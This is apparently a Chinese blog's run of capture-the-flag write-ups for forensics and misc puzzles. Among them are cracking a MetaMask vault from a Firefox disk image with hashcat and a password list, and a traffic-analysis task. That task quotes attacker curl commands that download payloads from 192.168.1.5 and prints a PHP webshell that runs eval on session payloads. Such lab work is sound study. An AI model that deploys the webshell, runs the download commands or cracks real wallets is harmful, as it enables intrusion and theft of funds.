可以正常解压拿到flag：\nWMCTF{dae66e1b-a0e7-4744-ade3-f5a5b4a95c09} metasecret 复现的时候找到一篇文章，感觉也挺有参考价值的，是关于Google插件中小狐狸钱包助记词恢复的：https://zgao.top/metamask%E4%BB%8E%E6%8F%92%E4%BB%B6%E6%96%87%E4%BB%B6%E4%B8%AD%E6%81%A2%E5%A4%8D%E5%8A%A9%E8%AE%B0%E8%AF%8D/\n附件为ad1文件，使用FTK Imager挂载\n在Firefox中，需要找到idb文件进而获取MetaMask的vault，可以结合着修改日期来找，发现idb文件位于目录G:\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\jawk8d8g.default-release\\storage\\default\\moz-extension+++654e5b4f-4a65-4e1a-9b58-51733b6a2883^userContextId=4294967295\\idb\\3647222921wleabcEoxlt-eengsairo.files下，文件名称为492\n可以010 Editor硬搜 keyMetadata ，然后从里面找出vault：\n{\u0026#34;data\u0026#34;:\u0026#34;WT5WJKyy+Ol+hgVsSKViRytzII2INhhftI5RJlgvuNuLx/MxDXMZtaIxfNeC/7LnvcfgitrTcQCQBh5ULv8AemL6SFSjzcACNrlCRIcppYmUFuMp6clW7nUi+My0Rj521yd/kwmLuHNToIRiACSezzLAWHkLXnZuvtDX2zyRvISZ0AQBseFXBecB0xKa0hcdoGsxBRBnK0vPvFf8b9TGfFAB7Qefh2O8GrFqzc40qX42gCgs+gVe0uq0A6SUSMKlwomMSfGQZJt6xfwMBZy8Or0kO0+D2Bjj0AgyIZaOeQ6S8IL/zcfO5Qi+gFaGpo6sGVOk1Yiu9+8enZvOuUW5IiIgydrzFKRixEMClAPa9MLDt3cksq52DxzorFLN8vYBqFY39DYQdSebg0HC6+Ww7XMz+b8FFKLqxLroar8F8IxP9WE1BHDIiT7mOcrUZnKW+W1Mmq6vbz+XuHmpz46OR8oD1KjwRVWV61qvTf7sg2H56fxbGrzjml89HATckwPrJ0cEwTAQcIkPZOA/DuuWsoHr6X6U4jYWJ+qwJFKYMIbwSWIdOmXKhb3kuJIS1YZzRCqHNJ0opudN6sRVOf/+nRp6wC4ww8LRTK1e1KTJ3aHdna7mIOJzMMO/0U0Gn9EDb4EMrK5XMzuZB0UaOR+9YmQaTUKGAQRNLVHMpdMgLQkVnxbZp4bIJiTRpXaKbIip+am9HAy4uq47vkY7ql72tQ5E4x9Ipkx4dKXF6ppiBBip6ag6QQ==\u0026#34;,\u0026#34;iv\u0026#34;:\u0026#34;fPymLoml7KKyZ5wdqwylqg==\u0026#34;,\u0026#34;keyMetadata\u0026#34;:{\u0026#34;algorithm\u0026#34;:\u0026#34;PBKDF2\u0026#34;,\u0026#34;params\u0026#34;:{\u0026#34;iterations\u0026#34;:600000}},\u0026#34;salt\u0026#34;:\u0026#34;xN8qVOAe6KF+JTti1cOyGNBNdSWTlumu1YQi2A4GcbU=\u0026#34;} 用meta2hashcat转成hashcat支持的格式：\npython metamask2hashcat.py --vault wallet | tee wallet.hash $metamask$xN8qVOAe6KF+JTti1cOyGNBNdSWTlumu1YQi2A4GcbU=$fPymLoml7KKyZ5wdqwylqg==$WT5WJKyy+Ol+hgVsSKViRytzII2INhhftI5RJlgvuNuLx/MxDXMZtaIxfNeC/7LnvcfgitrTcQCQBh5ULv8AemL6SFSjzcACNrlCRIcppYmUFuMp6clW7nUi+My0Rj521yd/kwmLuHNToIRiACSezzLAWHkLXnZuvtDX2zyRvISZ0AQBseFXBecB0xKa0hcdoGsxBRBnK0vPvFf8b9TGfFAB7Qefh2O8GrFqzc40qX42gCgs+gVe0uq0A6SUSMKlwomMSfGQZJt6xfwMBZy8Or0kO0+D2Bjj0AgyIZaOeQ6S8IL/zcfO5Qi+gFaGpo6sGVOk1Yiu9+8enZvOuUW5IiIgydrzFKRixEMClAPa9MLDt3cksq52DxzorFLN8vYBqFY39DYQdSebg0HC6+Ww7XMz+b8FFKLqxLroar8F8IxP9WE1BHDIiT7mOcrUZnKW+W1Mmq6vbz+XuHmpz46OR8oD1KjwRVWV61qvTf7sg2H56fxbGrzjml89HATckwPrJ0cEwTAQcIkPZOA/DuuWsoHr6X6U4jYWJ+qwJFKYMIbwSWIdOmXKhb3kuJIS1YZzRCqHNJ0opudN6sRVOf/+nRp6wC4ww8LRTK1e1KTJ3aHdna7mIOJzMMO/0U0Gn9EDb4EMrK5XMzuZB0UaOR+9YmQaTUKGAQRNLVHMpdMgLQkVnxbZp4bIJiTRpXaKbIip+am9HAy4uq47vkY7ql72tQ5E4x9Ipkx4dKXF6ppiBBip6ag6QQ== 不过注意由于metamask变更过几次钱包的加密算法，所以需要在github下载导入hashcat的modules模块：\nhttps://github.com/flyinginsect271/MetamaskHashcatModule/blob/main/module-26650-win-linux.zip kali下可以将 .so 文件导入目录/usr/share/hashcat/modules，同时可以在磁盘目录文档中找到passwords.txt，进行hashcat爆破，过程中遇到了两个问题：\n第一个是无法识别hash文件格式，windows下可能需要用notepad打开 wallet.hash ，另存为utf-8编码格式\n第二个是在爆破时报内存不足：hashcat Device #1: Not enough allocatable device memory for this attack.，增加虚拟机的内存即可，我从2G加到了4G\n根据hashcat的提示，爆破完后还需要用以下命令才能看到password：\n$ hashcat -a 0 -m 26650 wallet.hash passwords.txt --show $metamask$xN8qVOAe6KF+JTti1cOyGNBNdSWTlumu1YQi2A4GcbU=$fPymLoml7KKyZ5wdqwylqg==$WT5WJKyy+Ol+hgVsSKViRytzII2INhhftI5RJlgvuNuLx/MxDXMZtaIxfNeC/7LnvcfgitrTcQCQBh5ULv8AemL6SFSjzcACNrlCRIcppYmUFuMp6clW7nUi+My0Rj521yd/kwmLuHNToIRiACSezzLAWHkLXnZuvtDX2zyRvISZ0AQBseFXBecB0xKa0hcdoGsxBRBnK0vPvFf8b9TGfFAB7Qefh2O8GrFqzc40qX42gCgs+gVe0uq0A6SUSMKlwomMSfGQZJt6xfwMBZy8Or0kO0+D2Bjj0AgyIZaOeQ6S8IL/zcfO5Qi+gFaGpo6sGVOk1Yiu9+8enZvOuUW5IiIgydrzFKRixEMClAPa9MLDt3cksq52DxzorFLN8vYBqFY39DYQdSebg0HC6+Ww7XMz+b8FFKLqxLroar8F8IxP9WE1BHDIiT7mOcrUZnKW+W1Mmq6vbz+XuHmpz46OR8oD1KjwRVWV61qvTf7sg2H56fxbGrzjml89HATckwPrJ0cEwTAQcIkPZOA/DuuWsoHr6X6U4jYWJ+qwJFKYMIbwSWIdOmXKhb3kuJIS1YZzRCqHNJ0opudN6sRVOf/+nRp6wC4ww8LRTK1e1KTJ3aHdna7mIOJzMMO/0U0Gn9EDb4EMrK5XMzuZB0UaOR+9YmQaTUKGAQRNLVHMpdMgLQkVnxbZp4bIJiTRpXaKbIip+am9HAy4uq47vkY7ql72tQ5E4x9Ipkx4dKXF6ppiBBip6ag6QQ==:silversi 拿到password之后可以去官网解这个vault拿到私钥助记词：\nacid happy olive slim crane avoid there cave umbrella connect rain vessel 重置密码的时候小狐狸钱包一直在转圈，不知道怎么回事，打算用非预期解法，从Firefox缓存入手：\n可以看到不少url里都有web3mq，这是一个Web3的社交应用，结合前面的metamask，可以想到应该在这上面有过聊天记录，可以直接找 /messages/history ，再到 entries 目录下找到对应的 cache name ：\nFirefox使用 Brotli 压缩来优化缓存，所以把对应文件的前面一小段base64编码后在线网站解压缩即可拿到聊天记录：\n{\u0026#34;msg\u0026#34;:\u0026#34;Ok\u0026#34;,\u0026#34;code\u0026#34;:0,\u0026#34;data\u0026#34;:{\u0026#34;result\u0026#34;:[{\u0026#34;cipher_suite\u0026#34;:\u0026#34;NONE\u0026#34;,\u0026#34;from\u0026#34;:\u0026#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\u0026#34;,\u0026#34;from_sign\u0026#34;:\u0026#34;L2uZmWFwNvh/XcMKET1Y60MntEQTBfZHzL/ajlP3czOKzi2Y7RdwAzZuz9UwKENSLlcH2Ym9bRmHVkTBksynAA==\u0026#34;,\u0026#34;message_status\u0026#34;:{},\u0026#34;messageid\u0026#34;:\u0026#34;ecc2379ad6f01ec8376d6c9655b46a4f3cd686c23dc1756ed9637ec2\u0026#34;,\u0026#34;payload\u0026#34;:\u0026#34;Z29vZA==\u0026#34;,\u0026#34;payload_type\u0026#34;:\u0026#34;text/plain; charset=utf-8\u0026#34;,\u0026#34;replyid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;threadid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;timestamp\u0026#34;:1721371760065,\u0026#34;topic\u0026#34;:\u0026#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\u0026#34;,\u0026#34;version\u0026#34;:0},{\u0026#34;cipher_suite\u0026#34;:\u0026#34;NONE\u0026#34;,\u0026#34;from\u0026#34;:\u0026#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\u0026#34;,\u0026#34;from_sign\u0026#34;:\u0026#34;LA/24PvEbe1jxV24bF5QBvvoeb89hzjZPaNZLiwBnStYrMpJSkkkWEc5K0XkX5vDhLagMh7OuaGrl7ImoN4uBQ==\u0026#34;,\u0026#34;message_status\u0026#34;:{},\u0026#34;messageid\u0026#34;:\u0026#34;3a2d4cb900bc16c319e1e9ac2fc9cda2d749ea9f6898ebaba0133802\u0026#34;,\u0026#34;payload\u0026#34;:\u0026#34;V01DVEZ7YWFhMzViYTItMDQxYy00YWVjLTk0MzYtY2UzYTJhZDFjNzM0fQ==\u0026#34;,\u0026#34;payload_type\u0026#34;:\u0026#34;text/plain; charset=utf-8\u0026#34;,\u0026#34;replyid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;threadid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;timestamp\u0026#34;:1721371722987,\u0026#34;topic\u0026#34;:\u0026#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\u0026#34;,\u0026#34;version\u0026#34;:0},{\u0026#34;cipher_suite\u0026#34;:\u0026#34;NONE\u0026#34;,\u0026#34;from\u0026#34;:\u0026#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\u0026#34;,\u0026#34;from_sign\u0026#34;:\u0026#34;kDCiK+0w6gcur7OZRTZQSKNU9cEA04RhLmi8v5GhH6zAo6TUQzvhvQ8Z2zi/dh3D8BdKXdQmc2HOEK9MTV7aBQ==\u0026#34;,\u0026#34;message_status\u0026#34;:{},\u0026#34;messageid\u0026#34;:\u0026#34;d47b782dc38c2002cbd5000b14ddb7ba21c4883be92d6b9942a08649\u0026#34;,\u0026#34;payload\u0026#34;:\u0026#34;VGhhbmsgeW91LCB0aGlzIGlzIHlvdXIgZmxhZy4=\u0026#34;,\u0026#34;payload_type\u0026#34;:\u0026#34;text/plain; charset=utf-8\u0026#34;,\u0026#34;replyid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;threadid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;timestamp\u0026#34;:1721371673089,\u0026#34;topic\u0026#34;:\u0026#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\u0026#34;,\u0026#34;version\u0026#34;:0},{\u0026#34;cipher_suite\u0026#34;:\u0026#34;NONE\u0026#34;,\u0026#34;from\u0026#34;:\u0026#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\u0026#34;,\u0026#34;from_sign\u0026#34;:\u0026#34;DLSkIXdyfUo1EY9QFdp7jHrYL9HhXuI+lOS6exqklgvAnTFmlHNRl4vk1hlTASnAKNyg2b9SJOklEXPl+AxdDA==\u0026#34;,\u0026#34;message_status\u0026#34;:{},\u0026#34;messageid\u0026#34;:\u0026#34;16c6ef4e0d5b83def0c2d9e406b154ad044ef67601570796b3c20465\u0026#34;,\u0026#34;payload\u0026#34;:\u0026#34;aSdsbCB0YWtlIGl0\u0026#34;,\u0026#34;payload_type\u0026#34;:\u0026#34;text/plain; charset=utf-8\u0026#34;,\u0026#34;replyid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;threadid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;timestamp\u0026#34;:1721371628519,\u0026#34;topic\u0026#34;:\u0026#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\u0026#34;,\u0026#34;version\u0026#34;:0},{\u0026#34;cipher_suite\u0026#34;:\u0026#34;NONE\u0026#34;,\u0026#34;from\u0026#34;:\u0026#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\u0026#34;,\u0026#34;from_sign\u0026#34;:\u0026#34;EsfXRObp/043zRJ313zDi3zofTTKGnKHasiDOCGgyB3Hc8J9nut3S8ZPb8/KyjR7EPDSt0ugsCvEzx6grXxYBg==\u0026#34;,\u0026#34;message_status\u0026#34;:{},\u0026#34;messageid\u0026#34;:\u0026#34;43a57138b5c364f32fe5ee2ef046b9645c9851cce080e75e03a5c392\u0026#34;,\u0026#34;payload\u0026#34;:\u0026#34;ZW1tbW0sIG9rYXk=\u0026#34;,\u0026#34;payload_type\u0026#34;:\u0026#34;text/plain; charset=utf-8\u0026#34;,\u0026#34;replyid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;threadid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;timestamp\u0026#34;:1721371618534,\u0026#34;topic\u0026#34;:\u0026#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\u0026#34;,\u0026#34;version\u0026#34;:0},{\u0026#34;cipher_suite\u0026#34;:\u0026#34;NONE\u0026#34;,\u0026#34;from\u0026#34;:\u0026#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\u0026#34;,\u0026#34;from_sign\u0026#34;:\u0026#34;QfqCvxmhBvy5a5yEP6DRe0C+cV/IVUA9Kh+npDo1RsmiVd0jIEFG1FX15684ODAnFELhr40gIO5dER2/6tcMBg==\u0026#34;,\u0026#34;message_status\u0026#34;:{},\u0026#34;messageid\u0026#34;:\u0026#34;8dc377d950eebf6f4fe712d75a89bc8f70d894e4fd39eea931910b32\u0026#34;,\u0026#34;payload\u0026#34;:\u0026#34;c3VyZSwgdiBtZSA1MGJ0YyBmb3Igb25lIGZsYWc=\u0026#34;,\u0026#34;payload_type\u0026#34;:\u0026#34;text/plain; charset=utf-8\u0026#34;,\u0026#34;replyid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;threadid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;timestamp\u0026#34;:1721371554406,\u0026#34;topic\u0026#34;:\u0026#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\u0026#34;,\u0026#34;version\u0026#34;:0},{\u0026#34;cipher_suite\u0026#34;:\u0026#34;NONE\u0026#34;,\u0026#34;from\u0026#34;:\u0026#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\u0026#34;,\u0026#34;from_sign\u0026#34;:\u0026#34;MyAt7xuoYAs+7ie8NgwePsQEDt4ivonO4KOpW/5Mcz4HtDh8RxEXoQy4gN5Wq9WOO+kQ6FICpkI59H+lAm6SCw==\u0026#34;,\u0026#34;message_status\u0026#34;:{},\u0026#34;messageid\u0026#34;:\u0026#34;fc12125fed349389c6cde1e340fadaf32f8202c1b55040b8637ae3e4\u0026#34;,\u0026#34;payload\u0026#34;:\u0026#34;aSdtIGZyb20gWElBTllVLCB5b3Ugc2F5IHlvdSBoYXZlIGZsYWdzIGZvciBXTUNURiwgaXMgaXQgcmVhbD8=\u0026#34;,\u0026#34;payload_type\u0026#34;:\u0026#34;text/plain; charset=utf-8\u0026#34;,\u0026#34;replyid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;threadid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;timestamp\u0026#34;:1721371497684,\u0026#34;topic\u0026#34;:\u0026#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\u0026#34;,\u0026#34;version\u0026#34;:0},{\u0026#34;cipher_suite\u0026#34;:\u0026#34;NONE\u0026#34;,\u0026#34;from\u0026#34;:\u0026#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\u0026#34;,\u0026#34;from_sign\u0026#34;:\u0026#34;T1bIBWnO/htVa8Ud2HFeqrQYeJrw0wpxLkLN2BAsoT4/g0/LWzJOwLEn04H6B1pCjZKgN/ZR47SvQNhWYAENDQ==\u0026#34;,\u0026#34;message_status\u0026#34;:{},\u0026#34;messageid\u0026#34;:\u0026#34;af9ebc306bc64ce753ab97a1932576992bf05d4748d519a1df772d0f\u0026#34;,\u0026#34;payload\u0026#34;:\u0026#34;SGVsbG8uIENhbiBJIGhlbHAgeW91Pw==\u0026#34;,\u0026#34;payload_type\u0026#34;:\u0026#34;text/plain; charset=utf-8\u0026#34;,\u0026#34;replyid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;threadid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;timestamp\u0026#34;:1721371341771,\u0026#34;topic\u0026#34;:\u0026#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\u0026#34;,\u0026#34;version\u0026#34;:0},{\u0026#34;cipher_suite\u0026#34;:\u0026#34;NONE\u0026#34;,\u0026#34;from\u0026#34;:\u0026#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\u0026#34;,\u0026#34;from_sign\u0026#34;:\u0026#34;lgvVImaXV0yoZ/DuTqfKsH4rWbTUDhaHrZ6q+0wZ52/VO+ew4zgmM3kz+TDFU+k/nSbVvI85m0FQmHUUsD3bBg==\u0026#34;,\u0026#34;message_status\u0026#34;:{},\u0026#34;messageid\u0026#34;:\u0026#34;5c54e800ae8c47b614ea8eb7c2b75cf5169ef606596a409c2da447fb\u0026#34;,\u0026#34;payload\u0026#34;:\u0026#34;aGk=\u0026#34;,\u0026#34;payload_type\u0026#34;:\u0026#34;text/plain; charset=utf-8\u0026#34;,\u0026#34;replyid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;threadid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;timestamp\u0026#34;:1721371219728,\u0026#34;topic\u0026#34;:\u0026#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\u0026#34;,\u0026#34;version\u0026#34;:0}],\u0026#34;total\u0026#34;:9}} payload 即为聊天内容，不过被base64编码过了，根据 timestamp 解一下就能拿到完整的聊天记录：\nHello. Can I help you? i\u0026#39;m from XIANYU, you say you have flags for WMCTF, is it real? sure, v me 50btc for one flag emmmm, okay i\u0026#39;ll take it Thank you, this is your flag. WMCTF{aaa35ba2-041c-4aec-9436-ce3a2ad1c734} good ","permalink":"https://blog.w8nn9z.top/posts/ctf/wmctf-2024-forensics-writeup/","summary":"","title":"WMCTF 2024 Forensics Writeup"},{"content":"BrickGame 题目内容：\n通关小游戏即可获得flag。\n通关小游戏即可，一共三个关卡：\n漏洞探踪，流量解密 题目内容：\n网站遭遇异常攻击，通过日志与流量锁定攻击来源，阶段二的压缩包密码是攻击来源ip地址，比如127.0.0.1，对捕获的数据包进行解密，识别加密算法并还原flag。flag格式为flag:{xxxxx}\n附件给了第一阶段和第二阶段两个文件夹，根据题目内容可知要先从第一阶段获取攻击ip地址\n第一阶段的文件夹中给了一个日志文件 oa.access.log 和一个流量文件 第一阶段.cap\n先看看流量，流量里相当一部分http响应状态码都是404，并且如果翻看http导出对象的话，可以发现明显是在进行敏感目录扫描，并且大小基本都是564bytes：\n找大小明显不同的，发现 gateway.php 明显很大，还有敏感目录 upload.php ：\n并且这些http响应全是OK，可以试着过滤出http响应是OK的流量：\nhttp.response.phrase == \u0026#34;OK\u0026#34; 仔细看看 upload.php 的文件流量，能看到上传了一个jpg图片马：\n在网上找找这个敏感目录，可以找到一个通达OA 任意文件上传+文件包含导致RCE的洞，之后在日志文件里找找就能发现有几个ip都访问这个目录的记录，一个一个试过来，最后发现攻击ip是192.168.30.234：\n拿攻击ip解第二阶段的压缩包，解出来一个新的流量文件 二阶段汇总.cap，一样先看看明显不同的http对象：\n一个key，一个raw，再看看 gateway.php 进行的操作可以发现有两条比较重要的，还有一条提示了加密方式：\ntcp.stream eq 91 \u0026amp;f=curl+-o+%25TEMP%25%5Ckey.exe+http%3A%2F%2F192.168.1.5%2Fkey url解码后结果： \u0026amp;f=curl -o %TEMP%\\key.exe http://192.168.1.5/key tcp.stream eq 95 Encryption is R, C, 4. Good luck tcp.stream eq 220 \u0026amp;f=curl+-o+%25TEMP%25%5Ckey.exe+http%3A%2F%2F192.168.1.5%2Fraw url解码后结果： \u0026amp;f=curl -o %TEMP%\\key.exe http://192.168.1.5/raw 注意raw开头重复了key，删掉再RC4解就行了：\n最安全的加密方式 题目内容：\n找到了一个最安全的加密方式，然后将自己的密码用这种方式加密起来，你能破解出来吗？\n流量里上传了加密脚本以及 flag.rar ，先全部提出来：\n\u0026lt;?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u0026lt;strlen($D);$i++) { $c = $K[$i+1\u0026amp;15]; $D[$i] = $D[$i]^$c; } return $D; } $pass=\u0026#39;25ming@\u0026#39;; $payloadName=\u0026#39;payload\u0026#39;; $key=\u0026#39;3c6e0b8a9c15224a\u0026#39;; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (stripos($data,\u0026#34;getBasicsInfo\u0026#34;)!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 用25ming@解rar，拿到 flag.txt ，结合加密脚本可以知道里面都是md5值：\n8fa14cdd754f91cc6554c9e71929cce7 2db95e8e1a9267b7a1188556b2013b33 0cc175b9c0f1b6a831c399e269772661 b2f5ff47436671b6e533d8dc3614845d f95b70fdc3088560732a5ac135644506 b9ece18c950afbfa6b0fdbfa4ff731d3 2510c39011c5be704182423e3a695e91 e1671797c52e15f763380b45e841ec32 b14a7b8059d9c055954c92674ce60032 6f8f57715090da2632453988d9a1501b cfcd208495d565ef66e7dff9f98764da 03c7c0ace395d80182db07ae2c30f034 e358efa489f58062f10dd7316b65649e b14a7b8059d9c055954c92674ce60032 c81e728d9d4c2f636f067f89cc14862c e1671797c52e15f763380b45e841ec32 4a8a08f09d37b73795649038408b5f33 4c614360da93c0a041b22e537de151eb 4b43b0aee35624cd95b910189b3dc231 e1671797c52e15f763380b45e841ec32 b14a7b8059d9c055954c92674ce60032 e1671797c52e15f763380b45e841ec32 8d9c307cb7f3c4a32822a51922d1ceaa 4a8a08f09d37b73795649038408b5f33 4b43b0aee35624cd95b910189b3dc231 57cec4137b614c87cb4e24a3d003a3e0 83878c91171338902e0fe0fb97a8c47a e358efa489f58062f10dd7316b65649e 865c0c0b4ab0e063e5caa3387c1a8741 d95679752134a2d9eb61dbd7b91c4bcc 7b8b965ad4bca0e41ab51de7b31363a1 9033e0e305f247c0c3c80d0c7848c8b3 9033e0e305f247c0c3c80d0c7848c8b3 9033e0e305f247c0c3c80d0c7848c8b3 cbb184dd8e05c9709e5dcaedaa0495cf 本来还在想怎么搞md5里的pass和key，后来在线网站找了几个前面的md5，发现是分别对应 f l a g 的md5值，直接爆破：\nimport string import hashlib flag = \u0026#34;\u0026#34; s = string.ascii_letters + \u0026#34;0123456789\u0026#34; + \u0026#34;_{@}\u0026#34; with open(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;) as f: lines = f.readlines() for line in lines: for j in s: if line.replace(\u0026#34;\\n\u0026#34;,\u0026#34;\u0026#34;) == hashlib.md5(j.encode()).hexdigest(): flag += j print(flag) #flag{The_m0st_2ecUre_eNcrYption} ","permalink":"https://blog.w8nn9z.top/posts/ctf/ccb-2024-misc-writeup/","summary":"","title":"第四届长城杯 MISC Writeup"},{"content":"NepMagic —— CheckIn 先简述一下一开始失败的过程：\n可以先用RGSSAD解压器，搞出个data文件夹，里面是游戏的地图、人物啥的.rxdata数据，再用RXDataEditor可以解析这些数据，里面直接分析map，可以发现前面十来个map基本没在游戏里出现，map中找到npc，再翻翻目录下的内容，就可以找到npc的对话信息：\n以为拼一拼就能拿到flag，搞了半天，最后发现有一段不是npc嘴里的（\n唉，既然知道地图不多也没啥怪，就老老实实走得了，中间有一张地图多踩踩能出一段隐藏的flag，最后拿到完整flag：\n3DNep 附件里一个.gltf文件，找个在线的GLTF模型查看器直接看，能看到底部有个QRcode：\n找找资料发现是汉信码，直接扫就能拿到flag：\nNemophila 附件有个加密zip和一个mimi.py：\nimport base64 print(\u0026#34;这里有一个藏宝室，镇守着一个宝箱怪，当你说出正确的口令时，你也就快获得了这个屋子里最至高无上的宝物。\u0026#34;) print(\u0026#34;提示：宝箱怪只会提示你口令正确与否，请你试试吧！\u0026#34;) flag = input(\u0026#39;Turn in your guess: \u0026#39;) if len(flag) !=48: print(\u0026#34;长度不对！\u0026#34;) exit(1) if ord(flag.capitalize()[0]) != 83 or not flag[0].islower(): #s print(\u0026#34;Please try again!\u0026#34;) exit(1) if flag[-3:] != \u0026#34;ve}\u0026#34;: print(\u0026#34;Please try again!\u0026#34;) exit(1) if flag.count(chr(95)) != 4: print(\u0026#34;Please try again!\u0026#34;) exit(1) if base64.b64encode((flag[10:13]+flag[28:31]).encode(\u0026#39;utf-8\u0026#39;)).decode() != \u0026#39;RnJpSGlt\u0026#39;: print(\u0026#34;Please try again!\u0026#34;) exit(1) if int(flag[24:26]) \u0026gt; 10 and int(flag[24:26]) \u0026lt; 20 and pow(int(flag[24:26]),2,5) != 0: print(\u0026#34;好像有点不对！\u0026#34;) exit(1) number = flag[33] + flag[41] + flag[43:45] if int(number) * 9_27 != 1028970 and not number.isnumeric(): print(\u0026#34;还是不对呢！\u0026#34;) exit(1) if flag[35:41].replace(\u0026#34;e\u0026#34;, \u0026#34;1\u0026#34;) != \u0026#34;1t1rna\u0026#34;: print(\u0026#34;Please try again!\u0026#34;) exit(1) if flag[31:33].swapcase() != \u0026#34;ME\u0026#34;: print(\u0026#34;这不是我!\u0026#34;) exit(1) if list(map(len,flag.split(\u0026#34;_\u0026#34;))) != [6, 12, 14, 7, 5] and list(map(len,flag.split(\u0026#34;\u0026amp;\u0026#34;))) != [17, 9, 20]: print(\u0026#34;换个顺序！\u0026#34;) exit(1) if ord(min(flag[:2].swapcase())) != 69: print(\u0026#34;Please try again!\u0026#34;) exit(1) if flag[2] + flag[4:6] != \u0026#34;cet4\u0026#34;[:3]: print(\u0026#34;我不想考四级！\u0026#34;) exit(1) new=\u0026#34;\u0026#34; for i in flag[7:10] + flag[18] + flag[26]: new += chr(ord(i) + 1) if new != \u0026#34;jt|Df\u0026#34;: print(\u0026#34;Please try again!\u0026#34;) exit(1) if \u0026#34;SunR\u0026#34; in flag and \u0026#34;eren\u0026#34; in flag: print(\u0026#34;好像对了！可以先去试试！\u0026#34;) exit(1) print(\u0026#34;恭喜你~发现了上个世纪的秘密~快去向冒险家协会索要报酬吧！\u0026#34;) 根据逻辑来就行，不过能通过口令验证的字符串还挺多的，改了好几次才出正确口令：\n\u0026#39;\u0026#39;\u0026#39; s 0 e 1 c 2 et 4-5 _ 6 is{ 7-9 Fri 10-12 \u0026amp; 17 C 18 _ 19 10/15/20 24-25 e 26 \u0026amp; 27 Him 28-30 me 31-32 1 33 _ 34 eterna 35-40 1 41 _ 42 10 43-44 ve} 45-47 \u0026#39;\u0026#39;\u0026#39; flag = \u0026#34;sec et_is{Fri \u0026amp;C_ 10e\u0026amp;Himme1_eterna1_10ve}\u0026#34; \u0026#39;\u0026#39;\u0026#39; secret_is{FriSunR\u0026amp;C_eren10e\u0026amp;Himme1_eterna1_10ve} secret_is{Frieren\u0026amp;C_SunR10e\u0026amp;Himme1_eterna1_10ve} secret_is{Frieren\u0026amp;C_SunR10e\u0026amp;Himme1_1terna1_10ve} secret_is{Frieren\u0026amp;C_SunR10e\u0026amp;Himme1_et1rna1_10ve} secret_is{Frieren\u0026amp;C_SunR10e\u0026amp;Himme1_1t1rna1_10ve} \u0026#39;\u0026#39;\u0026#39; #最终的正确口令是：secret_is{Frieren\u0026amp;C_SunR15e\u0026amp;Himme1_eterna1_10ve} 解压缩包里面一个png，不过内容显然被加密过了，试了试异或png头，发现开头是sec，想着肯定是异或刚刚的口令：\n能看到正常图片了，010打开发现CRC校验有误，爆破一下宽高再改改就能出flag了：\nNepCamera 描述说是摄像头记录，wireshark启动发现是USB流量，简单翻了翻能看到基本都是以jpg图片的形式传输信息的，一开始先试着导出了frame.number==1的usb.iso.data，里面分了好几段，有固定的数据头0c啥的，距离jpg文件头有24字节，试着把每一段开头都删掉24字节，再把逗号删了，发现提取出来的图片还是很清晰的，不过只有一小部分，大小是60kb，frame.number==2对应的也是jpg数据，加在第一张图片后面就行了，连续搞了三段共180kb大小的图片，初见端倪：\n之后想过写脚本啥的，毕竟感觉这个图片还是有一定的拼接顺序在里面的，虽然一个一个搞出来也能看，比赛期间全都是手撸+硬看了，比较搞的是这个图片相当一部分都不暴露flag信息，只能硬猜，最后搞出了几张能猜出flag的图片：\n比较难猜的是flag最后还有一个s\nflag{Th3_c4mer4_takes_c1ear_pictures}\n","permalink":"https://blog.w8nn9z.top/posts/ctf/nepctf-2024-misc-writeup/","summary":"","title":"NepCTF 2024 MISC Writeup"},{"content":"简历 题目内容：\n本题灵感来源于真实*产样本，flag为c2 ip的md5值。例如ip为127.0.0.1，flag则为flag{f528764d624db129b32c21fbca0cb8d6}\n题目就一个附件 张小可 